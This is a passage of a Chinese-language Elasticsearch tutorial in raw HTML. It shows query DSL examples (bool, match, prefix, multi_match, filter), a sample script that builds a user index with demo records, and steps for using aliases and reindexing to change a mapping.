start=\"6\">\n<li><strong>exists</strong></li>\n</ol>\n<p>exists 过滤可以用于查找拥有某个域的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#搜索 exists：是指包含某个域的数据检索  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;exists&quot;:&#123;  </span><br><span class=\"line\">      &quot;field&quot;:&quot;address&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li><strong>bool 查询</strong></li>\n</ol>\n<p>bool 可以用来合并多个条件查询结果的布尔逻辑，它包含以下操作符：</p>\n<ul>\n<li><p>must : 多个查询条件的完全匹配,相当于 and。</p>\n</li>\n<li><p>must_not : 多个查询条件的相反匹配，相当于 not。</p>\n</li>\n<li><p>should : 至少有一个查询条件匹配, 相当于 or。</p>\n</li>\n</ul>\n<p>这些参数可以分别继承一个过滤条件或者一个过滤条件的数组：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#过滤搜索 bool   </span><br><span class=\"line\">#must : 多个查询条件的完全匹配,相当于 and。  </span><br><span class=\"line\">#must\\_not : 多个查询条件的相反匹配，相当于 not。  </span><br><span class=\"line\">#should : 至少有一个查询条件匹配, 相当于 or。  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;bool&quot;: &#123;  </span><br><span class=\"line\">      &quot;must&quot;: \\[  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">          &quot;term&quot;: &#123;  </span><br><span class=\"line\">            &quot;city&quot;: &#123;  </span><br><span class=\"line\">              &quot;value&quot;: &quot;深圳&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;,  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">          &quot;range&quot;:&#123;  </span><br><span class=\"line\">            &quot;age&quot;:&#123;  </span><br><span class=\"line\">              &quot;gte&quot;:20,  </span><br><span class=\"line\">              &quot;lte&quot;:99  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li><strong>match_all 查询</strong></li>\n</ol>\n<p>可以查询到所有文档，是没有查询条件下的默认语句。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#查询所有 match\\_all  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li><strong>match 查询</strong></li>\n</ol>\n<p>match查询是一个标准查询，不管你需要全文本查询还是精确查询基本上都要用到它。如果你使用 match 查询一个全文本字段，它会在真正查询之前用分析器先分析match一下查询字符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#字符串匹配  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match&quot;: &#123;  </span><br><span class=\"line\">      &quot;description&quot;: &quot;武汉广州&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"10\">\n<li><strong>prefix 查询</strong></li>\n</ol>\n<p>以什么字符开头的，可以更简单地用 prefix ,例如查询所有以张开始的用户描述</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#前缀匹配 prefix  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;prefix&quot;: &#123;  </span><br><span class=\"line\">      &quot;name&quot;: &#123;  </span><br><span class=\"line\">        &quot;value&quot;: &quot;赵&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"10\">\n<li><strong>multi_match 查询</strong></li>\n</ol>\n<p>multi_match查询允许你做match查询的基础上同时搜索多个字段，在多个字段中同时查一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#多个域匹配搜索  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;multi\\_match&quot;: &#123;  </span><br><span class=\"line\">      &quot;query&quot;: &quot;深圳&quot;,  </span><br><span class=\"line\">      &quot;fields&quot;: \\[  </span><br><span class=\"line\">        &quot;city&quot;,  </span><br><span class=\"line\">        &quot;description&quot;  </span><br><span class=\"line\">      \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"11\">\n<li><strong>filter</strong></li>\n</ol>\n<p>因为过滤可以使用缓存，同时不计算分数，通常的规则是，使用查询（query）语句来进行 全文 搜索或者其它任何需要影响 相关性得分 的搜索。除此以外的情况都使用过滤（filters)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;bool&quot;: &#123;  </span><br><span class=\"line\">      &quot;filter&quot;: &#123;  </span><br><span class=\"line\">         &quot;range&quot;:&#123;  </span><br><span class=\"line\">          &quot;age&quot;:&#123;  </span><br><span class=\"line\">            &quot;gte&quot;:25,  </span><br><span class=\"line\">            &quot;lte&quot;: 80  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>完整DSL案例代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_cat/health?v  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_cat/nodes?v  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_cat/indices?v  </span><br><span class=\"line\">  </span><br><span class=\"line\">DELETE /user  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT /user  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT /user/\\_mapping  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;properties&quot;: &#123;  </span><br><span class=\"line\">    &quot;name&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;city&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;long&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;description&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT /user/\\_doc/1  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;李四&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:22,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;李四来自湖北武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=2  </span><br><span class=\"line\">PUT /user/\\_doc/2  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;王五&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:35,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;王五家住在深圳！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=3  </span><br><span class=\"line\">PUT /user/\\_doc/3  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:19,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在深圳打工，来自湖北武汉&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:66,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=5  </span><br><span class=\"line\">PUT /user/\\_doc/5  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵子龙&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:77,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;赵子龙来自深圳宝安，但是在广州工作！&quot;,  </span><br><span class=\"line\">  &quot;address&quot;:&quot;广东省茂名市&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=6  </span><br><span class=\"line\">PUT /user/\\_doc/6  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵毅&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:55,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;赵毅来自广州白云区，从事电子商务8年！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=7  </span><br><span class=\"line\">PUT /user/\\_doc/7  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵哈哈&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:57,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;武汉赵哈哈，在深圳打工已有半年了，月薪7500！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_doc/4  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">#更新数据,id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:66,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#使用POST更新某个域的数据  </span><br><span class=\"line\">POST /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;doc&quot;:&#123;  </span><br><span class=\"line\">    &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">    &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_doc/2  </span><br><span class=\"line\">  </span><br><span class=\"line\">#搜索排序  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;sort&quot;:&#123;  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#分页实现  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;sort&quot;:&#123;  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;from&quot;: 0,  </span><br><span class=\"line\">  &quot;size&quot;: 2  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#查询-term  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;term&quot;:&#123;  </span><br><span class=\"line\">      &quot;city&quot;:&quot;武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#查询-terms 允许多个Term  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;terms&quot;:&#123;  </span><br><span class=\"line\">      &quot;city&quot;:  </span><br><span class=\"line\">        \\[  </span><br><span class=\"line\">          &quot;武汉&quot;,  </span><br><span class=\"line\">          &quot;广州&quot;  </span><br><span class=\"line\">        \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match&quot;: &#123;  </span><br><span class=\"line\">      &quot;city&quot;: &quot;广州武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;query\\_string&quot;: &#123;  </span><br><span class=\"line\">      &quot;default\\_field&quot;: &quot;city&quot;,  </span><br><span class=\"line\">      &quot;query&quot;: &quot;广州武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#-range 范围过滤  </span><br><span class=\"line\">#gt表示&gt; gte表示=&gt;  </span><br><span class=\"line\">#lt表示&lt; lte表示&lt;=  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;range&quot;: &#123;  </span><br><span class=\"line\">      &quot;age&quot;: &#123;  </span><br><span class=\"line\">        &quot;gte&quot;: 30,  </span><br><span class=\"line\">        &quot;lte&quot;: 57  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#搜索 exists：是指包含某个域的数据检索  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;exists&quot;:&#123;  </span><br><span class=\"line\">      &quot;field&quot;:&quot;address&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">#过滤搜索 bool   </span><br><span class=\"line\">#must : 多个查询条件的完全匹配,相当于 and。  </span><br><span class=\"line\">#must\\_not : 多个查询条件的相反匹配，相当于 not。  </span><br><span class=\"line\">#should : 至少有一个查询条件匹配, 相当于 or。  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;bool&quot;: &#123;  </span><br><span class=\"line\">      &quot;must&quot;: \\[  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">          &quot;term&quot;: &#123;  </span><br><span class=\"line\">            &quot;city&quot;: &#123;  </span><br><span class=\"line\">              &quot;value&quot;: &quot;深圳&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;,  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">          &quot;range&quot;:&#123;  </span><br><span class=\"line\">            &quot;age&quot;:&#123;  </span><br><span class=\"line\">              &quot;gte&quot;:20,  </span><br><span class=\"line\">              &quot;lte&quot;:99  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#查询所有 match\\_all  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#字符串匹配  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match&quot;: &#123;  </span><br><span class=\"line\">      &quot;description&quot;: &quot;武汉广州&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#前缀匹配 prefix  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;prefix&quot;: &#123;  </span><br><span class=\"line\">      &quot;name&quot;: &#123;  </span><br><span class=\"line\">        &quot;value&quot;: &quot;赵&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#多个域匹配搜索  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;multi\\_match&quot;: &#123;  </span><br><span class=\"line\">      &quot;query&quot;: &quot;深圳&quot;,  </span><br><span class=\"line\">      &quot;fields&quot;: \\[  </span><br><span class=\"line\">        &quot;city&quot;,  </span><br><span class=\"line\">        &quot;description&quot;  </span><br><span class=\"line\">      \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;bool&quot;: &#123;  </span><br><span class=\"line\">      &quot;filter&quot;: &#123;  </span><br><span class=\"line\">         &quot;range&quot;:&#123;  </span><br><span class=\"line\">          &quot;age&quot;:&#123;  </span><br><span class=\"line\">            &quot;gte&quot;:25,  </span><br><span class=\"line\">            &quot;lte&quot;: 80  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-4-使用别名\"><a href=\"#4-4-使用别名\" class=\"headerlink\" title=\"4.4 使用别名\"></a>4.4 使用别名</h2><p>在mysql中 我们经常遇到产品修改需求 我们可能会在原有数据库表基础上 对字段 索引 类型进行修改比如 增加一个字段 添加一个字段的索引 又或者修改某个字段的类型，这一切都看起来这么自然 不过在ES这里却是行不通的 ES的mapping一旦设置了之后，可以改，但是改了没有用，因为ES默认是对所有字段进行索引 如果你修改了mapping 那么已经索引过的数据就必须全部重新索引一遍 , ES没有提供这个机制, 只能利用别名手工刷数据，</p>\n<ol>\n<li><strong>添加索引别名</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT article1/\\_alias/article  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">&quot;acknowledged&quot; : true  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>创建新article2索引（增加了一个owner字段）</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT article2  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t&quot;settings&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;number\\_of\\_shards&quot;: 3,  </span><br><span class=\"line\">\t\t&quot;number\\_of\\_replicas&quot;: 1 ,  </span><br><span class=\"line\">\t\t&quot;analysis&quot; : &#123;  </span><br><span class=\"line\">\t\t\t&quot;analyzer&quot; : &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;ik&quot; : &#123;  </span><br><span class=\"line\">\t\t\t\t\t&quot;tokenizer&quot; : &quot;ik\\_max\\_word&quot;  </span><br><span class=\"line\">\t\t\t\t&#125;  </span><br><span class=\"line\">\t\t\t&#125;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">\t&quot;mappings&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;properties&quot;: &#123;  </span><br><span class=\"line\">\t\t\t&quot;id&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;title&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">\t\t\t\t&quot;analyzer&quot;: &quot;ik\\_max\\_word&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;content&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">\t\t\t\t&quot;analyzer&quot;: &quot;ik\\_max\\_word&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;viewCount&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;integer&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;creatDate&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;date&quot;,  </span><br><span class=\"line\">\t\t\t\t&quot;format&quot;: &quot;yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch\\_millis&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;tags&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">\t\t\t&#125;,   </span><br><span class=\"line\">\t\t\t&quot;owner&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">\t\t\t&#125;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>重建索引 reindex</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST \\_reindex  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t&quot;source&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;index&quot;: &quot;article1&quot;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">\t&quot;dest&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;index&quot;: &quot;article2&quot;  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>修改别名映射</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_aliases  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t&quot;actions&quot;: \\[  </span><br><span class=\"line\">\t&#123;  </span><br><span class=\"line\">\t\t&quot;remove&quot;: &#123;  </span><br><span class=\"line\">\t\t\t&quot;index&quot;: &quot;article1&quot;,  </span><br><span class=\"line\">\t\t\t&quot;alias&quot;: &quot;article&quot;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">\t&#123;  </span><br><span class=\"line\">\t\t&quot;add&quot;: &#123;  </span><br><span class=\"line\">\t\t\t&quot;index&quot;: &quot;article2&quot;,  </span><br><span class=\"line\">\t\t\t&quot;alias&quot;: &quot;article&quot;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t\\]  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span 